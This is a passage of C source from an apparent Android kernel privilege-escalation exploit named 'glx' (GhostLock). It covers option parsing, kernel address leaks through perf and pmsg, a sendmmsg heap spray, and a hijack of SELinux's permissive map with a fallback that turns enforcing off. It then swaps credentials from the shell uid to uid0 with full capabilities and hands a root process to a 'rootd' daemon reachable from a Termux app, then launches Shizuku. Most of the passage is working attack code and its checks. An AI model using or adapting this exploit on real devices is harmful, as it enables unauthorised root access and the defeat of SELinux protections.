        if (req_ok) {
            L("VR A/B reader(shell uid=%d) %.200s rc=%d ; post uid0 "
              "%.200s bytes=%d",
              g_rq->child_uid, reader_path, g_rq->neg_vr_rc, vr_sel,
              vr_post_bytes);
        } else {
            L("VR A/B reader probe timed out (use the in-process pre-cred "
              "probe instead)");
        }
        if (req_ok && same_path) {
            pre_rc = g_rq->neg_vr_rc;
            pre_src = "reader child uid2000 open()";
        } else if (g_vr_pre_done) {
            int i;
            for (i = 0; i < VR_NCAND; i++) {
                if (!strcmp(vr_sel, VR_CANDIDATES[i])) {
                    pre_rc = g_vr_pre_rc[i];
                    pre_src = "in-process uid2000 rd_file()";
                    break;
                }
            }
        }
        if (!same_path) {
            res("VR_AB_SKIP", 1,
                "A/B not asserted: vt=%s != reader probe %s (path assumption "
                "would be the same mistake as fact 732)", vr_sel, reader_path);
            g_vr_ab = "AB_SKIP";
        } else {
            int ab = vr_ab_ok(pre_rc, vr_post_ok, same_path);
            res("VR_AB_PRE_DENIED", pre_rc == -13,
                "shell(uid2000, pre-cred) read %s rc=%d (want -13 EACCES; %s)",
                vr_sel, pre_rc, pre_src);
            res("VR_AB_POST_ROOT", vr_post_ok != 0,
                "post-cred uid0 open+read %s bytes=%d", vr_sel, vr_post_bytes);
            res("VR_AB", ab, "same_path=%d pre_rc=%d post_ok=%d", same_path,
                pre_rc, vr_post_ok);
            g_vr_ab = ab ? "AB_OK" : "AB_FAIL";
        }
    } else {
        res("VR_AB_SKIP", 1, "no VR target selected; A/B not assertable");
        g_vr_ab = "AB_SKIP";
    }

    /* -------- identity / pose invariants (capget(2) / prctl(2) only) ----- */
    {
        struct vr_pose_s ps;
        struct capstate cs;
        char pctx[160] = {0};
        char enf[32] = {0};
        int r;

        memset(&ps, 0, sizeof(ps));
        memset(&cs, 0, sizeof(cs));
        self_ctx(pctx, sizeof(pctx));
        if (cap_get_self(&cs) != 0) { cs.eff = 0; }
        cs.bnd = cap_bset_bits();
        r = rd_file("/sys/fs/selinux/enforce", enf, sizeof(enf));
        ps.ctx = pctx;
        ps.enforce = (r > 0) ? enf : "";
        ps.eff = cs.eff;
        ps.bnd = cs.bnd;
        ps.bnd_pre = g_bnd_pre;
        ps.have_bnd_pre = g_pose_pre_done;
        ps.secbits = (unsigned long)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0);
        ps.secbits_pre = g_secbits_pre;
        ps.have_secbits_pre = g_pose_pre_done;
        L("VR pose uid=%d euid=%d ctx=%s enforce=%s eff=%#lx bnd=%#lx "
          "bnd_pre=%#lx added=%#lx securebits=%#lx(pre=%#lx)",
          getuid(), geteuid(), pctx, ps.enforce[0] ? ps.enforce : "?",
          ps.eff, ps.bnd, g_bnd_pre,
          ps.have_bnd_pre ? (ps.bnd & ~ps.bnd_pre) : 0UL,
          ps.secbits, g_secbits_pre);
        res("VR_ID_CTX", strstr(pctx, DOM_SHELL) != NULL, "ctx=%s (want %s)",
            pctx, DOM_SHELL);
        res("VR_ID_ENFORCE", ps.enforce[0] && strcmp(ps.enforce, "1") == 0,
            "enforce=%s (want 1)", ps.enforce[0] ? ps.enforce : "?");
        res("VR_ID_CAPEFF", (ps.eff & VR_POSE_BITS) == VR_POSE_BITS,
            "CapEff=%#lx (want bits %#lx; capget(2))", ps.eff, VR_POSE_BITS);
        res("VR_ID_CAPBND", (ps.bnd & VR_POSE_BITS) == VR_POSE_BITS &&
            (ps.bnd >> (VR_CAP_LAST_CAP + 1)) == 0,
            "CapBnd=%#lx (want bits %#lx, no bit > CAP_LAST_CAP=%lu; "
            "prctl PR_CAPBSET_READ)", ps.bnd, VR_POSE_BITS, VR_CAP_LAST_CAP);
        res("VR_ID_SECUREBITS", !ps.have_secbits_pre ||
            ps.secbits == ps.secbits_pre,
            "securebits=%#lx (pre=%#lx; prctl PR_GET_SECUREBITS)",
            ps.secbits, ps.secbits_pre);
        res("VR_IDENTITY", vr_pose_ok(&ps),
            "ctx/enforce/eff/bnd/securebits invariants combined");
    }
   /* glx_p10: the delivery leg issues no GhostLock shot of its own; the
     * ledger is the chain ledger.  The N9-fallback run is not gated (the PERM
     * stages are legitimately absent) -- its own res() checks are the gate. */
    if (!g_n9_used && !g_ledger_off) {
        if (g_ambient)
            shotlog_verify(SHOTLEDGER_DELIVERY, SHOTLEDGER_DELIVERY_N, "delivery");
        else
            shotlog_verify(SHOTLEDGER_DELIVERY_NOAMB, SHOTLEDGER_DELIVERY_NOAMB_N,
                           "delivery-noamb");
    } else {
        L("SHOTLEDGER[delivery] not gated (n9_fallback=%d readback=%d shots=%d)",
          g_n9_used, g_ledger_off, g_shotlog_n);
    }
    /* item ① ordering: release the listener, and never hand off on partial
     * evidence.  The ledger check above must stay BEFORE any execve. */
    reader_stop();                  /* glx_p7 fix 1: no orphan @glx-shell-454 */
    if (g_fails) return -1;
    if (deliver_handoff() != 0) return -1;
    return 0;
}

/* ------------------------------------------------------------------- main */
static void usage(void)
{
    fprintf(stderr,
        "glx %s\n"
        "  --mode qemu|device|auto   backend (auto: /proc/glctl => qemu)\n"
        "  --round N                 boot/retry ordinal (log only)\n"
        "  --log PATH                log file\n"
        "  --spray-off N             ignored (kept for CLI compat): the device\n"
        "                            spray is now the fixed fact-569 sendmmsg\n"
        "                            geometry, not a pselect6 template offset\n"
        "  --delta PATH              policy blob to gate+load\n"
        "                            (device default %s, qemu default /policy_delta.bin)\n"
        "  --vr-target PATH          uid0 read-back proof file (optional override;\n"
        "                            default: runtime 0600 candidate list, first\n"
        "                            entry %s)\n"
        "  --neg-target PATH         DEPRECATED and no longer a gate (i730):\n"
        "                            the old /init 'denial' was a wrong path\n"
        "                            assumption (fact 732: root:shell 0750\n"
        "                            symlink, the shell CAN read it)\n"
        "  --vr-exec-probe PATH      internal: post-execve child used by VR to\n"
        "                            re-check cap_bset across the exec boundary\n"
        "  --deliver-exec PATH       after a fully clean delivery, execve(PATH) to\n"
        "                            hand the uid0 shell-domain process to rootd\n"
        "                            (default off; nothing runs after the handoff)\n"
        "  --deliver-audit-log PATH  argv[1] for rootd: --audit-log=PATH\n"
        "                            (default %s; envp stays NULL so rootd's\n"
        "                            default uid whitelist 10369 is kept)\n"
        "  --deliver-no-audit-arg    hand off with the argc==1 shape (no argv[1])\n"
        "  --no-pmsg-refill          do NOT re-zero the pmsg ring before each write\n"
        "  --zd=file|tcp|auto        zero-delta delivery transport (no delta, no\n"
        "                            policy load).  DEFAULT file (the device\n"
        "                            rejects IP egress incl. 127.0.0.1); auto =\n"
        "                            UDP sendto probe, tcp only if it returns 1\n"
        "  --deliver-fork            path A: run the EMBEDDED rootd in a fork()ed\n"
        "                            child WITHOUT execve (keeps uid0+cap_eff/inh/amb)\n"
        "  --zd-daemon PATH          standalone rootd_zd for the exec shape\n"
        "  --zd-secret-file PATH     32-byte shared secret, 0600 (created if absent;\n"
        "                            default the Termux home zd_secret)\n"
        "  --zd-client-selftest     after LISTEN, fork a 10369 child and drive\n"
        "                            auth + R(entropy.dat) + 3 REPL commands\n"
        "  --zd-secret-uid N         provision the secret AS uid N (default 10369\n"
        "                            = Termux; -1 = never create, only reuse)\n"
        "  --zd-dir PATH             file-channel dir (default\n"
        "                            /data/data/com.termux/files/home/zd_chan;\n"
        "                            create it inside Termux first)\n"
        "  --zd-tag NAME             file-channel tag (default glx10; client must\n"
        "                            use the same tag)\n"
        "  --zd-port N               pin the TCP port (default 0 = ephemeral; pin it\n"
        "                            so the Termux client can start before glx)\n"
        "  --no-ambient              fork-only tier: skip WC4/WC5 (14-shot ledger;\n"
        "                            no execve anywhere, VR exec probe becomes SKIP)\n"
        "  --perm-fallback=n9|abort  on PERM failure fall back to the legacy global\n"
        "                            N9 permissive and restore enforcing via\n"
        "                            selinuxfs (N10_LEGIT) once uid0+cap is held\n"
        "  --perm-skip               skip PERM entirely (implies --perm-fallback=n9)\n"
        "  --perm-force              same-boot re-arm: accept a permissive_map node\n"
        "                            that is already our planned fake node, but\n"
        "                            only after PERM_VRF proves its content\n"
        "  --no-purge                i731 A/B: skip the post-shot fake-lock purge\n"
        "  --no-quiesce              i731 A/B: skip the post-shot thread teardown\n"
        "  --setids-glibc            i739 A/B: use the glibc setresgid/setresuid\n"
        "                            wrappers (NPTL setxid broadcast, NOT the\n"
        "                            default) instead of raw svc 149/147\n"
        "  --allow-mt-setids         i739 A/B: allow raw SETIDS with Threads>1\n"
        "                            (default is fail-closed Threads==1)\n"
        "  --stop-after=postshot     i731: stop right after seal+quiesce (no SETIDS)\n"
        "  --perm-armed              third state: this boot is ALREADY armed --\n"
        "                            read back node==X && highbit==W plus the\n"
        "                            node's PERM_IMG content, then skip\n"
        "                            PERM_PRE/PERMNODE/PERM_HI and go straight\n"
        "                            to SETIDS (0 GhostLock writes; mismatch\n"
        "                            aborts cleanly)\n"
        "  --stop-after=STAGE        stop cleanly after a stage:\n"
        "                            permpre | permnode | permhi | permset |\n"
        "                            ambient-probe | deliver-fork |\n"
        "                            deliver-tcp | deliver-file\n"
        "  --perm-dwell=SEC          sleep SEC seconds before exiting a stop stage\n"
        "  --perm-allow-ambiguous    arm even if the pmsg ring start S was not sampled\n"
        "  --shz-apk PATH            Shizuku manager base.apk for the stage-3\n"
        "                            launch (default: auto-scan /data/app/\n"
        "                            moe.shizuku.privileged.api-*/base.apk)\n"
        "  --shz-lib PATH            libshizuku.so starter (default: derived\n"
        "                            from the apk: <apkdir>/lib/arm64/...)\n"
        "  --shz-mode=starter|appprocess|auto\n"
        "                            exec libshizuku.so --apk=<apk> (the exact\n"
        "                            Manager contract) or app_process directly\n"
        "  --shz-env-file PATH       init env source (default: /proc/1/environ,\n"
        "                            then /data/system/environ/classpath, with a\n"
        "                            compiled C.53 snapshot as the floor)\n"
        "  --shz-keep-old            do not SIGKILL a pre-existing shizuku_server\n"
        "  --shz-check-only          verify an existing shizuku_server only\n"
        "  --shz-wait-ms N           how long to watch the child for an early exit\n"
        "  --shz-app-process PATH    override /system/bin/app_process\n"
        "  --shz-after-deliver       defer stage 3 until AFTER the delivery leg\n"
        "                            (Phase B: fork rootd + 10369 client); one\n"
        "                            run then walks Phase A -> Phase B -> stage 3\n"
        "  --perm-probe=PATH         post-activation SELinux-only probe (D row;\
\n"
        "                            diagnostic only, never a PASS/FAIL gate)\n"
        "                            shot (diagnostic only; stale lock => BUG_ON)\n"
        "  --selftest                device mode: run ONLY the read-only S0 stages\n"
        "                            (preflight + D solve + pmsg vmap leak) and\n"
        "                            exit before any GhostLock write shot\n"
        "  --spray-selftest          host-side check of the fact-569 fill mapping\n"
        "                            (no syscall beyond stdout; exit 0 = PASS)\n"
        "  --verbose\n", VERSION, DEV_DELTA_PATH, DEV_VR_TARGET,
        g_deliver_audit);
}


/* ===== glx_p11i (intent 744): stage 3 helper ============================
 * Verbatim body of glx_p11t/glx_p11u's stage-3 block (intent 718), lifted
 * into a function so the SAME code runs either at the p11t position
 * (immediately after SETIDS/N10_LEGIT, before the ledger) or from main()
 * after delivery() with --shz-after-deliver.
 * Gates kept exactly as in p11u:
 *   - only --stop-after=shzlaunch|shzcheck may launch;
 *   - --no-ambient is the fork-only tier and must fail closed on
 *     shzlaunch (WC4/WC5 are what keeps CapEff/CapAmb across execve);
 *   - shzcheck / --shz-check-only never forks (read-only verify);
 *   - 0 GhostLock shots: plain fork+execve of /system/bin/app_process.
 * ====================================================================== */
static int stage3_shizuku(void)
{
    if (PERM_STAGE("shzlaunch") || PERM_STAGE("shzcheck")) {
        char slog[8192];
        char why[512];
        int src;

        slog[0] = 0;
        why[0] = 0;
        if (g_reader_up) reader_stop();  /* no orphan @glx-shell-454 (fact 628) */
        L("SHZ stage begin stop=%s uid=%d euid=%d ambient=%d", g_stop_after,
          getuid(), geteuid(), g_ambient);
        if (g_ambient) {
            struct capstate cs;
            cap_get_self(&cs);
            L("SHZ pre-exec cap_inh=%#lx cap_amb=%#lx cap_eff=%#lx "
              "(exec keeps pP'=pE'=pA'=ambient)", cs.inh, cap_ambient_bits(),
              cs.eff);
            res("SHZ_AMBIENT", (cs.inh & CRED_CAPS_FULL) == CRED_CAPS_FULL &&
                               (cap_ambient_bits() & CRED_CAPS_FULL) ==
                                   CRED_CAPS_FULL,
                "cap_inheritable=%#lx cap_ambient=%#lx (want bits %#lx; an "
                "execve in this state yields CapEff=%#lx, see "
                "GATE_NOTES_i553e.md)", cs.inh, cap_ambient_bits(),
                (unsigned long)CRED_CAPS_FULL,
                (unsigned long)CRED_CAPS_FULL);
        }
        /* glx_p11t (intent 718): the launch tier NEEDS the ambient writes.
         * --no-ambient is the fork-only send tier: WC4/WC5 are skipped and
         * an execve would then rebuild CapEff/CapAmb from the file caps
         * (fact 667 run7).  Refuse before forking. */
        if (!g_ambient && !g_shz.check_only && PERM_STAGE("shzlaunch")) {
            res("SHZ_AMBIENT_REQUIRED", 0,
                "--stop-after=shzlaunch needs WC4/WC5 (cap_inheritable "
                "0x28 + cap_ambient 0x48); drop --no-ambient (it belongs "
                "to the fork-only deliver-* tier)");
            g_perm_stopped = 1;
            return -1;
        }
        /* glx_p11t (intent 718): --shz-check-only means "verify only"; i553b
         * parsed it but never consumed it.  Wire it to the read-only path. */
        if (PERM_STAGE("shzcheck") || g_shz.check_only) {
            src = shz_check(slog, sizeof(slog), why, sizeof(why));
            printf("GLX|SHZCHECK|%s rc=%d %s\n",
                   src == SHZ_EXIT_OK ? "PASS" : "FAIL", src, why);
        } else {
            src = shz_run(&g_shz, slog, sizeof(slog), why, sizeof(why));
            printf("GLX|SHZLAUNCH|%s rc=%d mode=%s %s\n",
                   src == SHZ_EXIT_OK ? "PASS" : "FAIL", src,
                   g_shz.mode == SHZ_MODE_STARTER ? "starter" :
                   (g_shz.mode == SHZ_MODE_APPPROCESS ? "appprocess" : "auto"),
                   why);
        }
        L("SHZ stage log:\n%s", slog);
        res("SHZ_RC", src == 0, "rc=%d why=%s", src, why);
        if (src != 0) {
            L("SHZ failure code %d: 3 env/BOOTCLASSPATH, 4 fork, 5 "
              "execve(app_process) -- domain/env, 6 real uid not 0/2000, "
              "7 apk/lib path, 9 kill-old EPERM, 10 SELinux "
              "untrusted_app->self binder call/transfer denied, 11 "
              "post-launch verification (uid/caps/ctx)", src);
            g_perm_stopped = 1;
            return -1;
        }
        g_perm_stopped = 1;
        return 0;
    }
    return -1;                 /* not requested (defensive; caller gates) */
}

int main(int argc, char **argv)
{
    const char *mode = "auto";
    const char *logp = NULL;
    int i;
    unsigned long p0;
    struct chain C;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--mode") && i + 1 < argc) mode = argv[++i];
        else if (!strcmp(argv[i], "--round") && i + 1 < argc) g_round = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--log") && i + 1 < argc) logp = argv[++i];
        else if (!strcmp(argv[i], "--spray-off") && i + 1 < argc) spray_off = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--delta") && i + 1 < argc) g_delta_path = argv[++i];
        else if (!strcmp(argv[i], "--vr-target") && i + 1 < argc) {
            g_vr_target = argv[++i];
            g_vr_override = 1;
        }
        else if (!strcmp(argv[i], "--vr-exec-probe") && i + 1 < argc)
            g_vr_exec_probe = argv[++i];
        else if (!strcmp(argv[i], "--neg-target") && i + 1 < argc) g_neg_target = argv[++i];
        else if (!strcmp(argv[i], "--deliver-exec") && i + 1 < argc)
            g_deliver_exec = argv[++i];
        else if (!strncmp(argv[i], "--deliver-exec=", 15) && argv[i][15])
            g_deliver_exec = argv[i] + 15;
        else if (!strcmp(argv[i], "--deliver-audit-log") && i + 1 < argc)
            g_deliver_audit = argv[++i];
        else if (!strncmp(argv[i], "--deliver-audit-log=", 20) && argv[i][20])
            g_deliver_audit = argv[i] + 20;
        else if (!strcmp(argv[i], "--deliver-no-audit-arg"))
            g_deliver_audit_off = 1;
        else if (!strcmp(argv[i], "--deliver-fork")) g_deliver_fork = 1;
        else if (!strncmp(argv[i], "--zd=", 5)) {
            const char *v = argv[i] + 5;
            if (!strcmp(v, "legacy")) g_zd_chan = 0;
            else if (!strcmp(v, "tcp")) g_zd_chan = 1;
            else if (!strcmp(v, "file")) g_zd_chan = 2;
            else if (!strcmp(v, "auto")) g_zd_auto = 1;
            else { fprintf(stderr, "bad --zd=%s\n", v); return 5; }
        }
        else if (!strcmp(argv[i], "--zd-daemon") && i + 1 < argc) g_zd_daemon = argv[++i];
        else if (!strncmp(argv[i], "--zd-daemon=", 12) && argv[i][12]) g_zd_daemon = argv[i] + 12;
        else if (!strcmp(argv[i], "--zd-secret-file") && i + 1 < argc) g_zd_secret_file = argv[++i];
        else if (!strncmp(argv[i], "--zd-secret-file=", 17) && argv[i][17]) g_zd_secret_file = argv[i] + 17;
        else if (!strcmp(argv[i], "--zd-dir") && i + 1 < argc) g_zd_dir = argv[++i];
        else if (!strncmp(argv[i], "--zd-dir=", 9) && argv[i][9]) g_zd_dir = argv[i] + 9;
        else if (!strcmp(argv[i], "--zd-tag") && i + 1 < argc) g_zd_tag = argv[++i];
        else if (!strncmp(argv[i], "--zd-tag=", 9) && argv[i][9]) g_zd_tag = argv[i] + 9;
        else if (!strcmp(argv[i], "--zd-port") && i + 1 < argc) g_zd_port = atoi(argv[++i]);
        else if (!strncmp(argv[i], "--zd-port=", 10)) g_zd_port = atoi(argv[i] + 10);
        else if (!strcmp(argv[i], "--zd-secret-uid") && i + 1 < argc) g_zd_secret_uid = atoi(argv[++i]);
        else if (!strncmp(argv[i], "--zd-secret-uid=", 16)) g_zd_secret_uid = atoi(argv[i] + 16);
        else if (!strcmp(argv[i], "--zd-client-selftest")) g_zd_client_selftest = 1;
        else if (!strcmp(argv[i], "--no-ambient")) g_ambient = 0;
        else if (!strcmp(argv[i], "--perm-fallback") && i + 1 < argc)
            g_perm_fallback_n9 = !strcmp(argv[++i], "n9");
        else if (!strncmp(argv[i], "--perm-fallback=", 16))
            g_perm_fallback_n9 = !strcmp(argv[i] + 16, "n9");
        else if (!strcmp(argv[i], "--perm-skip")) { g_perm_skip = 1; g_perm_fallback_n9 = 1; }
        else if (!strcmp(argv[i], "--perm-force")) g_perm_force = 1;
        else if (!strcmp(argv[i], "--perm-armed")) g_perm_armed = 1;
        else if (!strcmp(argv[i], "--no-purge")) g_no_purge = 1;
        else if (!strcmp(argv[i], "--no-quiesce")) g_no_quiesce = 1;
        else if (!strcmp(argv[i], "--setids-glibc")) g_setids_glibc = 1;
        else if (!strcmp(argv[i], "--allow-mt-setids")) g_allow_mt_setids = 1;
        else if (!strcmp(argv[i], "--selftest")) g_selftest = 1;
        else if (!strcmp(argv[i], "--spray-selftest")) g_spray_selftest = 1;
        else if (!strcmp(argv[i], "--no-pmsg-refill")) g_pmsg_refill = 0;
        else if (!strcmp(argv[i], "--stop-after") && i + 1 < argc)
            g_stop_after = argv[++i];
        else if (!strncmp(argv[i], "--stop-after=", 13) && argv[i][13])
            g_stop_after = argv[i] + 13;
        else if (!strcmp(argv[i], "--perm-dwell") && i + 1 < argc)
            g_perm_dwell_s = atoi(argv[++i]);
        else if (!strncmp(argv[i], "--perm-dwell=", 13) && argv[i][13])
            g_perm_dwell_s = atoi(argv[i] + 13);
        else if (!strcmp(argv[i], "--perm-allow-ambiguous")) g_perm_allow_ambiguous = 1;
        else if (!strcmp(argv[i], "--shz-apk") && i + 1 < argc)
            g_shz.apk = argv[++i];
        else if (!strncmp(argv[i], "--shz-apk=", 10) && argv[i][10])
            g_shz.apk = argv[i] + 10;
        else if (!strcmp(argv[i], "--shz-lib") && i + 1 < argc)
            g_shz.lib = argv[++i];
        else if (!strncmp(argv[i], "--shz-lib=", 10) && argv[i][10])
            g_shz.lib = argv[i] + 10;
        else if (!strncmp(argv[i], "--shz-mode=", 11)) {
            const char *v = argv[i] + 11;
            if (!strcmp(v, "starter")) g_shz.mode = SHZ_MODE_STARTER;
            else if (!strcmp(v, "appprocess")) g_shz.mode = SHZ_MODE_APPPROCESS;
            else if (!strcmp(v, "auto")) g_shz.mode = SHZ_MODE_AUTO;
            else { fprintf(stderr, "bad --shz-mode=%s\n", v); return 5; }
        }
        else if (!strcmp(argv[i], "--shz-env-file") && i + 1 < argc)
            g_shz.env_file = argv[++i];
        else if (!strncmp(argv[i], "--shz-env-file=", 15) && argv[i][15])
            g_shz.env_file = argv[i] + 15;
        else if (!strcmp(argv[i], "--shz-keep-old")) g_shz.keep_old = 1;
        else if (!strcmp(argv[i], "--shz-check-only")) g_shz.check_only = 1;
        else if (!strcmp(argv[i], "--shz-after-deliver")) g_shz_after_deliver = 1;
        else if (!strcmp(argv[i], "--shz-wait-ms") && i + 1 < argc)
            g_shz.wait_ms = atoi(argv[++i]);
        else if (!strncmp(argv[i], "--shz-wait-ms=", 14))
            g_shz.wait_ms = atoi(argv[i] + 14);
        else if (!strcmp(argv[i], "--shz-app-process") && i + 1 < argc)
            g_shz.app_process = argv[++i];
        else if (!strncmp(argv[i], "--shz-app-process=", 18) && argv[i][18])
            g_shz.app_process = argv[i] + 18;
        else if (!strcmp(argv[i], "--perm-probe") && i + 1 < argc)
            g_perm_probe_path = argv[++i];
        else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) { usage(); return 0; }
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    /* glx_p4: the VR post-exec probe re-execs this very binary.  Handle it
     * before anything else (no preflight, no log file, no threads). */
    if (g_vr_exec_probe) return vr_exec_probe_child(g_vr_exec_probe);
    if (!strcmp(mode, "qemu")) g_qemu = 1;
    else if (!strcmp(mode, "device")) g_qemu = 0;
    else g_qemu = (access(GLCTL, R_OK | W_OK) == 0);
    g_dev = !g_qemu;
    if (!g_delta_path) g_delta_path = g_qemu ? "/policy_delta.bin" : DEV_DELTA_PATH;
    /* glx_p10 channel policy:
     *   planner 683/684 -> the device rejected IP egress, file was the default;
     *   fact 686      -> the IP gate is back (UDP loopback=1, TCP self=0), so
     *                    TCP is usable again and the file leg stays a fallback.
     * Default is therefore AUTO: UDP probe decides, file on any failure. */
    if (g_deliver_fork && !g_zd_chan && !g_zd_auto) g_zd_auto = 1;
    if (g_zd_auto) {
        int ipok = zd_ip_probe();
        if (ipok && g_zd_port) {
            g_zd_chan = 1;
        } else {
            g_zd_chan = 2;
            if (ipok)
                L("ZD channel auto: TCP is reachable but --zd-port was not "
                  "pinned (the Termux client could not discover an ephemeral "
                  "port) -> file channel");
        }
        L("ZD channel auto-selected: %s (file stays the IP-REJECT fallback)",
          g_zd_chan == 1 ? "tcp" : "file");
    }
    if (g_deliver_fork && !g_zd_chan) g_zd_chan = 2;
    if (g_zd_chan && !g_zd_daemon) g_zd_daemon = g_deliver_exec;
    if (g_zd_chan && !g_deliver_fork && (!g_zd_daemon || !*g_zd_daemon)) {
        fprintf(stderr, "--zd=%s needs --zd-daemon PATH, --deliver-exec PATH or "
                "--deliver-fork (embedded rootd)\n",
                g_zd_chan == 2 ? "file" : "tcp");
        return 5;
    }
    if (!g_vr_target)  g_vr_target  = DEV_VR_TARGET;
    if (!g_neg_target) g_neg_target = "/init";
    /* 5.4 perf_mmap() rejects non-power-of-two ring sizes with -EINVAL; the
     * device otherwise aborts in S0_D.  Guard the constants explicitly. */
    if ((RING_PAGES_D & (RING_PAGES_D - 1)) ||
        (RING_PAGES_PMSG & (RING_PAGES_PMSG - 1))) {
        fprintf(stderr, "glx: ring pages must be powers of two (%d/%d)\n",
                RING_PAGES_D, RING_PAGES_PMSG);
        return 9;
    }
    if (g_spray_selftest) {
        int rc = spray_selftest();
        printf("GLX|SPRAY_SELFTEST|%s rc=%d slot=0x%lx..0x%lx unctrl=0x%lx+%luB\n",
               rc == 0 ? "PASS" : "FAIL", rc,
               (unsigned long)WSLOT_STACK_OFF,
               (unsigned long)(WSLOT_STACK_OFF + WSLOT_LEN),
               (unsigned long)(WSLOT_STACK_OFF + WUNCTRL_OFF),
               (unsigned long)WUNCTRL_LEN);
        return rc == 0 ? 0 : 1;
    }

    g_logpath = logp ? logp : (g_qemu ? LOG_QEMU : LOG_DEVICE);
    g_log = fopen(g_logpath, "a");
    if (!g_log) fprintf(stderr, "glx: cannot open log %s\n", g_logpath);

    signal(SIGPIPE, SIG_IGN);
    if (g_qemu && getuid() == 0) {
        /* the real target runs as shell(uid2000); make the rehearsal read
         * chain see the same id values, then the cred swap must turn it 0. */
        setgid(2000);
        setuid(2000);
    }
    L("==== %s start mode=%s round=%d pid=%d uid=%d ====", VERSION,
      g_qemu ? "qemu" : "device", g_round, getpid(), getuid());
    L("paths delta=%s vr=%s neg=%s ring_pages D=%d pmsg=%d "
      "spray=sendmmsg2(af_inet,used@+0x3C18,iov@+0x3CA0) spray_off_ignored=%d",
      g_delta_path, g_vr_target, g_neg_target, RING_PAGES_D, RING_PAGES_PMSG, spray_off);
    /* P1: publish T's identity nonce before ring_setup() creates the thread. */
    nonce_init();

    if (g_qemu) {
        struct stat st;
        if (access(GLCTL, R_OK | W_OK) != 0) {
            if (stat("/gl_rw.ko", &st) == 0) {
                int fd = open("/gl_rw.ko", O_RDONLY);
                long rc = fd >= 0 ? syscall(SYS_finit_module, fd, "", 0) : -1;
                if (fd >= 0) close(fd);
                L("loaded gl_rw.ko rc=%ld", rc);
            }
        }
        if (access(GLCTL, R_OK | W_OK) != 0) {
            L("FATAL: qemu mode without /proc/glctl");
            return 3;
        }
    }

    if (g_selftest && g_qemu) {
        L("selftest is a device-only mode (qemu has no perf leak)");
        return 9;
    }
    if (preflight() != 0) { L("ABORT: preflight"); return 4; }
    if (g_selftest) {
        /* Read-only S0 verification of the two device primitives that the
         * 2^N ring fix and the REGS_INTR abi fix touch.  No pivot write, no
         * futex ring, no policy load, no 8-byte kernel write: this is what is
         * safe to run on the phone before the operator releases the shots. */
        int rc;
        L("SELFTEST begin (read-only: perf sampling + /dev/pmsg0 log feed only)");
        pin_cpu(g_main_cpu);
        rc = dev_solve_D_checked();
        res("ST_D_SOLVE", rc == 0, "D=%lx rc=%d", D, rc);
        if (rc == 0) {
            profile_device();
            rc = dev_pmsg_leak();
            res("ST_PMSG_MAP", rc == 0,
                "rc=%d base=%lx obj=%lx off=%#lx cursor=%#lx refills=%d",
                rc, g_vmap_base, g_vmap_obj,
                g_vmap_obj - g_vmap_base, g_pmsg_cursor, g_pmsg_refills);
        }
        /* the blob gate is pure file/DAC work: assert it here so the operator
         * sees S0_DELTA_GATE green before releasing any write shot. */
        {
            int g = delta_gate();
            res("ST_DELTA_GATE", g == 0, "rc=%d blob=%s", g, g_delta_path);
        }
        L("SELFTEST end fails=%d (no write shot issued)", g_fails);
        L("SELFTEST|RESULT=%s", g_fails ? "FAIL" : "PASS");
        return g_fails ? 1 : 0;
    }
    pin_cpu(g_main_cpu);   /* R2 must read rq->curr of the CPU we run on */
    if (g_qemu) {
        if (qemu_solve_D() != 0) { L("ABORT: D"); return 4; }
        if (pick_pivot_qemu() != 0) { L("ABORT: pivot"); return 4; }
        if (qemu_pmsg() != 0) { L("ABORT: pmsg vmap"); return 4; }
    } else {
        pin_cpu(g_main_cpu);
        if (dev_solve_D_checked() != 0) { L("ABORT: D (validated, 5 attempts)"); return 4; }
        profile_device();
        if (pick_pivot_device() != 0) { L("ABORT: pivot"); return 4; }
        if (device_pmsg() != 0) { L("ABORT: pmsg vmap (hard abort, no blind write)"); return 4; }
        g_fake_lock = g_vmap_obj;
        if (ring_setup() != 0) { L("ABORT: futex ring"); return 4; }
        msleep(100);
    }
    if (g_qemu) {
        L("ABORT: the per-SID permissive stage is device-only (selinux_ss and "
          "selinux_state live at the rehearsal kernel's own symbols; running "
          "it there would read/write unrelated memory)");
        return 9;
    }
    /* intent 662: no policy delta at all -- loading one after the
     * permissive_map hijack is fatal (policydb_destroy -> kmem_cache_free on
     * our pmsg page).  The file gate is intentionally not run. */
    L("DELTA_DISABLED: policy load is forbidden after the permissive_map "
      "hijack (fact 659 (5)); enforcing stays 1");
    if (!g_pmsg_refill) {
        L("ABORT: --no-pmsg-refill is incompatible with the per-SID permissive "
          "node (the refill is what restores node->next=0 before PERM_HI)");
        return 9;
    }
    if (!g_pmsg_start_certain && !g_perm_allow_ambiguous) {
        if (g_perm_fallback_n9) {
            g_perm_skip = 1;
            L("WARN: pmsg ring start S ambiguous (only base+0xC sampled) -- "
              "PERM not armed; --perm-fallback=n9 window will be used");
        } else {
            L("ABORT: pmsg ring start S ambiguous (only base+0xC sampled); refuse "
              "to arm. Cold-start and re-run, or pass --perm-allow-ambiguous "
              "(PERM_VRF still gates activation), or --perm-fallback=n9.");
            return 9;
        }
    }

    p0 = select_P0();
    C.p0 = p0;
    if (!p0) { L("ABORT: no P0 candidate"); return 4; }

    if (do_chain(&C) != 0) {
        char e[32];
        /* P5: if N9 already ran, put enforcing back before leaving. */
        if (g_enforce_off) enforce_restore(&C, "CHAIN_ABORT");
        e[0] = 0;
        if (rd_file("/sys/fs/selinux/enforce", e, sizeof(e)) < 0) snprintf(e, sizeof(e), "?");
        L("CHAIN_ABORT round=%d shots=%d fails=%d enforce=%s vr=%s vr_ab=%s",
          g_round, g_shots, g_fails, e, g_vr_verdict, g_vr_ab);
        L("STATE_CLEAR_REQUEST: an oops restarts the kernel (~5s); re-run with "
          "--round=%d to re-derive D and re-select P0", g_round + 1);
        return 2;
    }
    if (g_perm_stopped) {
        L("PERM_STOP=%s shots=%d fails=%d uid=%d euid=%d", g_stop_after,
          g_shots, g_fails, getuid(), geteuid());
        printf("GLX|PERM_STOP=%s shots=%d fails=%d uid=%d euid=%d\n",
               g_stop_after, g_shots, g_fails, getuid(), geteuid());
        return g_fails ? 1 : 0;
    }
    L("CHAIN_OK shots=%d", g_shots);

    if (g_dev && getuid() != 0) {
